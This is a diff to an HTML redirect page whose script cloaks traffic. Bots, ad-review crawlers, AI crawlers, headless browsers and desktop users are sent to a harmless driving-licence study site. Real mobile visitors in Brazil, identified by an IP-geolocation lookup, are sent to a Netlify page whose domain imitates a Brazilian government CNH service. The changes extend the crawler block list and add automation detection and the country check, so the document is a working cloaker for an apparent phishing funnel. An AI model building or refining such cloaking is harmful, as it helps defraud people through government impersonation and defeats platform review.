@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <title>Carregando...</title>
-<style>body{background:#fff;margin:0;}</style>
+<style>body{background:#fff;margin:0;padding:0;}</style>
 </head>
 <body>
 <script>
@@ -11,48 +11,36 @@
   var WHITE = "https://simuladodetranbrasil.com.br/apostilas-cnh-detran/";
   var BLACK = "https://novacnh-brasil-gov-br.netlify.app/";
 
-  function getParam(name) {
-    return new URLSearchParams(window.location.search).get(name);
-  }
+  // Bot User-Agents conhecidos incluindo crawlers do Facebook/Meta
+  var BOT_UA = [
+    "facebookexternalhit","facebot","meta-externalagent","meta-externalfetcher",
+    "linkedinbot","twitterbot","applebot","googlebot","bingbot","slurp",
+    "duckduckbot","baiduspider","yandexbot","sogou","exabot","ia_archiver",
+    "mj12bot","ahrefsbot","semrushbot","dotbot","rogerbot","pinterestbot",
+    "petalbot","bytespider","gptbot","chatgpt","claudebot","anthropic",
+    "headlesschrome","phantomjs","selenium","webdriver","puppeteer","playwright",
+    "python-requests","python-urllib","java/","curl/","wget/","libwww",
+    "scrapy","httpclient","okhttp","axios","node-fetch","postman",
+    "netsystemsresearch","dataforseo","archive.org","commoncrawl"
+  ];
 
   function isBot() {
     var ua = (navigator.userAgent || "").toLowerCase();
-    var botPatterns = [
-      "googlebot","bingbot","slurp","duckduckbot","baiduspider","yandexbot",
-      "sogou","exabot","facebot","ia_archiver","mj12bot","ahrefsbot","semrushbot",
-      "dotbot","rogerbot","linkedinbot","twitterbot","applebot","pinterestbot",
-      "petalbot","bytespider","gptbot","chatgpt","claudebot","anthropic",
-      "headlesschrome","phantomjs","selenium","webdriver","puppeteer","playwright",
-      "python-requests","python-urllib","java/","curl/","wget/","libwww",
-      "scrapy","httpclient","okhttp","axios","got ","node-fetch","postman"
-    ];
-    for (var i = 0; i < botPatterns.length; i++) {
-      if (ua.indexOf(botPatterns[i]) !== -1) return true;
+    for (var i = 0; i < BOT_UA.length; i++) {
+      if (ua.indexOf(BOT_UA[i]) !== -1) return true;
     }
+    // Detecta automação
+    if (navigator.webdriver) return true;
+    if (window._phantom || window.callPhantom) return true;
+    if (window.__nightmare) return true;
+    if (document.documentElement.getAttribute("webdriver")) return true;
     return false;
   }
 
   function isMobile() {
-    return /android|iphone|ipad|ipod|mobile/i.test(navigator.userAgent);
+    return /android|iphone|ipad|ipod/i.test(navigator.userAgent);
   }
 
-  function hasTrafficParams() {
-    var p = new URLSearchParams(window.location.search);
-    return p.get("fbclid") || p.get("utm_source") || p.get("gclid") || p.get("ttclid") || p.get("src");
-  }
-
-  function hasRealBrowser() {
-    try {
-      // Verifica se tem recursos de browser real
-      if (typeof window.chrome !== "undefined") return true;
-      if (typeof window.InstallTrigger !== "undefined") return true; // Firefox
-      if (navigator.plugins && navigator.plugins.length > 0) return true;
-      if (screen.width > 0 && screen.height > 0) return true;
-    } catch(e) {}
-    return false;
-  }
-
-  // Preserva UTMs na URL de destino
   function appendUtms(url) {
     var params = new URLSearchParams(window.location.search);
     var utmKeys = ["utm_source","utm_medium","utm_campaign","utm_content","utm_term","fbclid","ttclid","gclid","src","sck"];
@@ -66,20 +54,38 @@
     return url + (url.indexOf("?") === -1 ? "?" : "&") + qs;
   }
 
-  // Decisão — SÓ mobile (Android/iOS) entra no funil
-  var goBlack = false;
-
-  if (isBot()) {
-    goBlack = false;
-  } else if (isMobile()) {
-    goBlack = true;
-  } else {
-    // Desktop sempre vai para white
-    goBlack = false;
+  function goTo(url) {
+    window.location.replace(url);
   }
 
-  var dest = goBlack ? appendUtms(BLACK) : WHITE;
-  window.location.replace(dest);
+  // 1. Bot detectado → white
+  if (isBot()) {
+    goTo(WHITE);
+    return;
+  }
+
+  // 2. Desktop → white
+  if (!isMobile()) {
+    goTo(WHITE);
+    return;
+  }
+
+  // 3. Mobile → verifica país via API
+  fetch("https://ipapi.co/json/", { signal: AbortSignal.timeout(3000) })
+    .then(function(r){ return r.json(); })
+    .then(function(data){
+      var country = (data.country_code || "").toUpperCase();
+      if (country === "BR") {
+        goTo(appendUtms(BLACK));
+      } else {
+        goTo(WHITE);
+      }
+    })
+    .catch(function(){
+      // Se falhar a verificação de IP, deixa passar (mobile já validado)
+      goTo(appendUtms(BLACK));
+    });
+
 })();
 </script>
 </body>
